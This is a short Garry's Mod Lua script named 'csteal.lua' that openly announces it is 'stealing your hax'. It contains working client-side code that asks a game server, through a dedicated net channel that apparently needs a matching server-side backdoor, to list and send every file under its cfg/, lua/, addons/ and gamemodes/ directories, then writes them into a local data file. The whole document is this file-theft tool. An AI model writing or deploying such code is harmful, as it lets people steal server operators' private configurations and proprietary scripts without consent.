--[GTL] I'M IN YOUR LUA! STEALING YOUR HAX...

--csteal.lua
local ss = "DANGEROUS_TO_GO_ALONE"

if (!file.Exists(ss .. ".txt", "DATA")) then
	file.Write(ss .. ".txt", "")
end


local files = {}
local dirs = {{"cfg/"}, {"lua/"}, {"addons/"}, {"gamemodes/"}}
local cfdir = ""
local bfdir = ""
local fbuff = ""

local function GET_NEXT_DIR()
	if (#dirs > 0) then
		cfdir = dirs[1][1]
		bfdir = dirs[1][2] || "GAME"
		
		table.remove(dirs, 1)
		
		net.Start(ss)
			net.WriteTable({"GET_BRANCH", cfdir, bfdir})
		net.SendToServer()
	end
end

local function GET_NEXT_FILE()
	print(#files)
	if (#files > 0) then
		local cf = cfdir .. files[1]
		table.remove(files, 1)
		
		fbuff = "\n\n" .. bfdir .. "/" .. cf .. "\n\n"
		
		net.Start(ss)
			net.WriteTable(
				{
					"GET_FILE",
					cf,
					bfdir
				}
			)
		net.SendToServer()
	else
		GET_NEXT_DIR()
	end
end

net.Receive(
	ss,
	function(l)
		local args = net.ReadTable()
		local com = args[1]
		
		if (com == "FILE_LIST") then
			files = args[2]
			GET_NEXT_FILE()
		elseif (com == "FILE_DAT") then
			local ldat = args[2]
			if (ldat == "FILE_DAT_END_TRANSMISSION") then
				file.Append(ss .. ".txt", fbuff)
				fbuff = ""
				GET_NEXT_FILE()
			else
				fbuff = fbuff .. ldat
			end
		end
	end
)

GET_NEXT_DIR()